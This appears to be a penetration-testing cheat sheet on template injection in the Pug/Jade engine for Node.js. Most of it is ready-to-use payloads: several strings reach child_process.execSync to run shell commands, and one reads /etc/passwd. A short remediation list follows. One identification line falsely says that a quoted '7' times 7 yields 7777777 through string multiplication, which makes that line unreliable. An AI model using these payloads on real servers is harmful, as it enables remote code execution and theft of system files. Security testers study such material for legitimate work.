# Pug / Jade — Node.js Template Engine

## Summary
Pug (formerly Jade) is a template engine for Node.js/Express.

## Identification
```pug
#{7*7}       → 49
!{7*7}       → 49       (unescaped — can inject HTML)
#{"7"*7}     → 7777777  (JS string multiplication)
```

## Context
Pug uses indentation-based syntax. However, when user input is injected into an attribute value or inline text, `#{}` and `!{}` are evaluated.

```pug
// Template: p Welcome #{userInput}
// Input: #{7*7}
// Output: <p>Welcome 49</p>
```

## Basic Confirmation
```pug
#{7*7}
!{console.log(1)}
```

## RCE

```pug
# Using process.mainModule
#{process.mainModule.require('child_process').execSync('id')}

# Using global.process
#{global.process.mainModule.require('child_process').execSync('id')}

# Using require (if available)
#{require('child_process').execSync('id')}

# Using constructor
#{this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}
```

## Read Files
```pug
#{require('fs').readFileSync('/etc/passwd','utf8')}
```

## Remediation
- Never use `!{}` (unescaped) with user input
- Sanitize input before template compilation
- Use Handlebars which has safer defaults
